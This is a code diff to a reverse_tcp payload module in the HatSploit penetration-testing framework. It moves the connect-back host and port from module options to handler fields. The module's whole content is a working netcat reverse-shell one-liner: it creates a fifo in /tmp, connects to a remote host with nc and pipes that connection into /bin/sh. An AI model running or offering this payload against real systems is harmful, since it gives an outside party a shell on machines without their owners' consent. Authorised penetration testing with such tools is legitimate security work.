@@ -7,7 +7,6 @@
 
 from hatsploit.lib.payload import Payload
 
-from hatsploit.utils.tcp import TCPClient
 from hatsploit.utils.string import StringTools
 
 
@@ -26,25 +25,11 @@ class HatSploitPayload(Payload, StringTools):
         'Type': "reverse_tcp"
     }
 
-    options = {
-        'CBHOST': {
-            'Description': "Connect-back host.",
-            'Value': TCPClient.get_local_host(),
-            'Type': "ip",
-            'Required': True
-        },
-        'CBPORT': {
-            'Description': "Connect-back port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
-
     def run(self):
-        connback_host, connback_port = self.parse_options(self.options)
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         filename = self.random_string(8)
-        payload = f"mkfifo /tmp/{filename}; nc {connback_host} {connback_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
+        payload = f"mkfifo /tmp/{filename}; nc {remote_host} {remote_port} 0</tmp/{filename} | /bin/sh >/tmp/{filename} 2>&1; rm /tmp/{filename}"
 
         return payload
